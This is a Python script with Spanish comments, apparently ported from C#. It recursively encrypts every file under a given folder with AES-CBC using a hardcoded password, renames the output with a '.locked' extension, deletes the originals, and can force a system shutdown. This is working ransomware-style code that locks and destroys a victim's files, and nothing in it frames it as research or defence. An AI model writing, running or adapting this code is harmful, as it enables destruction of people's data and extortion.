import os
import sys
import argparse
from concurrent.futures import ThreadPoolExecutor
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend

SALT = b"Salt_De_Ejemplo_123"
KEY_SIZE_BYTES = 16  # 128 bits / 8

def derive_key_and_iv(password: str) -> tuple:
    # Equivalente a Rfc2898DeriveBytes en C# con 1000 iteraciones
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA1(),
        length=32,  # Necesitamos 16 bytes para la Key y 16 bytes para el IV
        salt=SALT,
        iterations=1000,
        backend=default_backend()
    )
    key_iv = kdf.derive(password.encode('utf-8'))
    key = key_iv[:16]
    iv = key_iv[16:32]
    return key, iv

def encrypt_file(file_path: str, password: str):
    output_path = file_path + ".locked"
    try:
        key, iv = derive_key_and_iv(password)
        
        # Leer archivo de entrada
        with open(file_path, "rb") as f_in:
            plaintext = f_in.read()
            
        # Aplicar padding PKCS7
        padder = padding.PKCS7(algorithms.AES.block_size).padder()
        padded_data = padder.update(plaintext) + padder.finalize()
        
        # Cifrar con AES-CBC
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        ciphertext = encryptor.update(padded_data) + encryptor.finalize()
        
        # Escribir archivo cifrado
        with open(output_path, "wb") as f_out:
            f_out.write(ciphertext)
            
    except Exception as ex:
        print(f"NO FUE POSIBLE cifrar EL ARCHIVO:\n{ex}")

def delete_file(file_path: str):
    try:
        if os.path.exists(file_path):
            # En Linux/Unix aseguramos permisos de escritura antes de borrar si fuera necesario
            os.chmod(file_path, 0o666)
            os.remove(file_path)
    except Exception as ex:
        print(f"NO FUE POSIBLE ELIMINAR EL ARCHIVO (Atributos/Permisos):\n{ex}")

def process_file_task(file_path: str, password: str):
    if not file_path.endswith(".locked"):
        nombre_archivo = os.path.basename(file_path)
        try:
            encrypt_file(file_path, password)
            print(f"Archivo cifrado (Paralelo): {nombre_archivo}")
            delete_file(file_path)
            print(f"Archivo eliminado (Paralelo): {nombre_archivo}")
        except Exception as ex:
            print(f"Error en {file_path}: {ex}")

def process_directory(target_directory: str, password: str, exclusions: list):
    print(f"Carpeta: {target_directory}")
    dir_name = os.path.basename(os.path.normpath(target_directory))
    
    if any(e.lower() == dir_name.lower() for e in exclusions):
        print(f"Saltando carpeta excluida: {target_directory}")
        return

    try:
        entries = os.listdir(target_directory)
    except Exception as ex:
        print(f"No se pudo listar el directorio {target_directory}: {ex}")
        return

    files = [os.path.join(target_directory, entry) for entry in entries if os.path.isfile(os.path.join(target_directory, entry))]
    subdirectories = [os.path.join(target_directory, entry) for entry in entries if os.path.isdir(os.path.join(target_directory, entry))]

    # Procesamiento paralelo de archivos equivalente a Parallel.ForEach
    with ThreadPoolExecutor() as executor:
        executor.map(lambda f: process_file_task(f, password), files)

    # Procesamiento recursivo de subdirectorios
    for subdirectory in subdirectories:
        process_directory(subdirectory, password, exclusions)

def apagar_equipo():
    if os.name == 'nt':
        os.system("shutdown /s /f /t 0")
    else:
        os.system("sudo shutdown -h now")

def main():
    password = "PasswordSegura123"
    exclusions = []

    if len(sys.argv) > 1:
        if sys.argv[1].upper() == "REINICIO":
            apagar_equipo()
        else:
            root_path = sys.argv[1]
            # Mapeo de exclusiones igual que en C# (desde args[2] en adelante)
            for i in range(2, len(sys.argv)):
                exclusions.append(sys.argv[i])
            process_directory(root_path, password, exclusions)
    else:
        print("Debe enviar atributos para la ejecución.")
    
    print("Proceso finalizado.")

if __name__ == "__main__":
    main()